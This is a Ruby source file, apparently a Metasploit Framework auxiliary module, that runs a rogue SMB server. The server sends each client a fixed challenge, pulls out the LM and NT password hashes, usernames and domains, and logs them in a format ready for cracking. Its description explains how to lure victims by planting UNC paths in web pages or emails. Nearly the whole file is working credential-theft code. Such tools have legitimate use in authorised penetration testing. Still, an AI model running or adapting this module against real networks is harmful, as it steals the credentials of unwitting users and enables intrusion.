##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::SMBServer
	
	def initialize
		super(
			'Name'        => 'Authentication Capture: SMB',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module provides a SMB service that can be used to
			capture the challenge-response password hashes of SMB client
			systems. All responses sent by this service have the same
			hardcoded challenge string (\x11\x22\x33\x44\x55\x66\x77\x88),
			allowing for easy cracking using Cain & Abel or L0phtcrack. 
			
			To exploit this, the target system must try to authenticate
			to this module. The easiest way to force a SMB authentication attempt
			is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or 
			email message. When the victim views the web page or email, their 
			system will automatically connect to the server specified in the UNC
			share (the IP address of the system running this module) and attempt
			to authenticate.
			},
			'Author'      => 'hdm',
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Sniffer' ]
				],
			'PassiveActions' => 
				[
					'Sniffer'
				],
			'DefaultAction'  => 'Sniffer'
		)
		
		register_options(
			[
				OptString.new('LOGFILE', [ false, "The local filename to store the captured hashes", nil ]),
				OptString.new('PWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ])				
			], self.class )		
		
	end

	def run
		@challenge = "\x11\x22\x33\x44\x55\x66\x77\x88"
		exploit()
	end

	def smb_cmd_dispatch(cmd, c, buff)
		smb = @state[c]

		case cmd
		when CONST::SMB_COM_NEGOTIATE
			smb_cmd_negotiate(c, buff)

		when CONST::SMB_COM_SESSION_SETUP_ANDX
			smb_cmd_session_setup(c, buff)
			
		when CONST::SMB_COM_TREE_CONNECT
			print_status("Denying tree connect from #{smb[:name]}")
			pkt = CONST::SMB_BASE_PKT.make_struct
			pkt['Payload']['SMB'].v['Command'] = cmd
			pkt['Payload']['SMB'].v['Flags1']  = 0x88
			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000022
			c.put(pkt.to_s)	
			
		else 
			print_status("Ignoring request from #{smb[:name]} (#{cmd})")
			pkt = CONST::SMB_BASE_PKT.make_struct
			pkt['Payload']['SMB'].v['Command'] = cmd
			pkt['Payload']['SMB'].v['Flags1']  = 0x88
			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			pkt['Payload']['SMB'].v['ErrorClass'] = 0
			c.put(pkt.to_s)	
		end
	end	

	def smb_cmd_negotiate(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_NEG_PKT.make_struct
		pkt.from_s(buff)
		
		# Record the remote process ID
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']

		# The hardcoded challenge value
		challenge = @challenge 

		group    = ''
		machine  = smb[:nbsrc]
		
		dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)
		# print_status("Negotiation from #{smb[:name]}: #{dialects.join(", ")}")
		
		dialect = 
			dialects.index("NT LM 0.12") || 
			dialects.length-1

		pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
		smb_set_defaults(c, pkt)

		time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
		pkt['Payload']['SMB'].v['Flags1'] = 0x88
		pkt['Payload']['SMB'].v['Flags2'] = 0xc001
		pkt['Payload']['SMB'].v['WordCount'] = 17
		pkt['Payload'].v['Dialect'] = dialect
		pkt['Payload'].v['SecurityMode'] = 3
		pkt['Payload'].v['MaxMPX'] = 2
		pkt['Payload'].v['MaxVCS'] = 1		
		pkt['Payload'].v['MaxBuff'] = 4356
		pkt['Payload'].v['MaxRaw'] = 65536
		pkt['Payload'].v['Capabilities'] = 0xe3fd # 0x80000000 for extended
		pkt['Payload'].v['ServerTime'] = time_lo
		pkt['Payload'].v['ServerDate'] = time_hi
		pkt['Payload'].v['Timezone']   = 0x0
		
		
		pkt['Payload'].v['SessionKey'] = 0
		pkt['Payload'].v['KeyLength'] = 8
		
		pkt['Payload'].v['Payload'] = 
			challenge + 
			Rex::Text.to_unicode(group) + "\x00\x00" +
			Rex::Text.to_unicode(machine) + "\x00\x00"

		c.put(pkt.to_s)
	end
	
	def smb_cmd_session_setup(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
		pkt.from_s(buff)
		

		# Record the remote multiplex ID
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
				
		lm_len = pkt['Payload'].v['PasswordLenLM'] 
		nt_len = pkt['Payload'].v['PasswordLenNT'] 
		
		lm_hash = pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0]
		nt_hash = pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
		
		
		buff = pkt['Payload'].v['Payload']
		buff.slice!(0, lm_len + nt_len)
		names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
		
		smb[:username] = names[0]
		smb[:domain]   = names[1]
		smb[:peer_os]   = names[2]
		smb[:peer_lm]   = names[3]
		
		
		# Clean up the data for loggging
		if (smb[:username] == "")
			smb[:username] = nil
		end
		
		if (smb[:domain] == "")
			smb[:domain] = nil
		end

		if (lm_hash == "52d536dbcefa63b9101f9c7a9d0743882f85252cc731bb25" or lm_hash == "" or lm_hash == "00")
			lm_hash = nil
		end

		if (nt_hash == "eefabc742621a883aec4b24e0f7fbf05e17dc2880abe07cc" or nt_hash == "")
			nt_hash = nil
		end
				
		print_status(
			"Captured #{smb[:name]} #{smb[:domain]}\\#{smb[:username]} " +
			"LMHASH:#{lm_hash ? lm_hash : "<NULL>"} NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
			"OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}"
		)
		
		report_auth_info(
			:host  => smb[:ip],
			:proto => 'smb_challenge',
			:targ_host => datastore['SRVHOST'],
			:targ_port => datastore['SRVPORT'],
			:user => smb[:username],
			:pass => 
				( nt_hash ? nt_hash : "<NULL>" ) + ":" + (lm_hash ? lm_hash : "<NULL>" ),
			:extra => "NAME=#{smb[:nbsrc]} DOMAIN=#{smb[:domain]} OS=#{smb[:peer_os]}"
		)
		
		report_note(
			:host  => smb[:ip],
			:type  => "smb_peer_os",
			:data  => smb[:peer_os]
		) if (smb[:peer_os] and smb[:peer_os].strip.length > 0)

		report_note(
			:host  => smb[:ip],
			:type  => "smb_peer_lm",
			:data  => smb[:peer_lm]
		) if (smb[:peer_lm] and smb[:peer_lm].strip.length > 0)

		report_note(
			:host  => smb[:ip],
			:type  => "smb_domain",
			:data  => smb[:domain]
		) if (smb[:domain] and smb[:domain].strip.length > 0)
		
		
		if(datastore['LOGFILE'])			
			fd = File.open(datastore['LOGFILE'], "a")
			fd.puts(
				[
					smb[:nbsrc],
					smb[:ip],
					smb[:username] ? smb[:username] : "<NULL>",
					smb[:domain] ? smb[:domain] : "<NULL>",
					smb[:peer_os],
					nt_hash ? nt_hash : "<NULL>",
					lm_hash ? lm_hash : "<NULL>",
					Time.now.to_s
				].join(":").gsub(/\n/, "\\n")
			)
			fd.close
		end
				
		if(datastore['PWFILE'] and smb[:username] and lm_hash)
			fd = File.open(datastore['PWFILE'], "a")
			fd.puts(
				[
					smb[:username],
					smb[:domain] ? smb[:domain] : "NULL",
					@challenge.unpack("H*")[0],
					lm_hash ? lm_hash : "0" * 32,
					nt_hash ? nt_hash : "0" * 32
				].join(":").gsub(/\n/, "\\n")
			)
			fd.close		
		
		end
		
		pkt = CONST::SMB_BASE_PKT.make_struct
		smb_set_defaults(c, pkt)
		
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
		pkt['Payload']['SMB'].v['Flags1']  = 0x88
		pkt['Payload']['SMB'].v['Flags2']  = 0xc001
		pkt['Payload']['SMB'].v['ErrorClass'] = 0xC0000022
		c.put(pkt.to_s)	
	end
	
		
	def smb_cmd_close(c, buff)
	end

	def smb_cmd_create(c, buff)
	end

	def smb_cmd_delete(c, buff)
	end

	def smb_cmd_nttrans(c, buff)
	end

	def smb_cmd_open(c, buff)
	end

	def smb_cmd_read(c, buff)
	end

	def smb_cmd_trans(c, buff)
	end

	def smb_cmd_tree_connect(c, buff)
	end

	def smb_cmd_tree_disconnect(c, buff)
	end

	def smb_cmd_write(c, buff)
	end


end
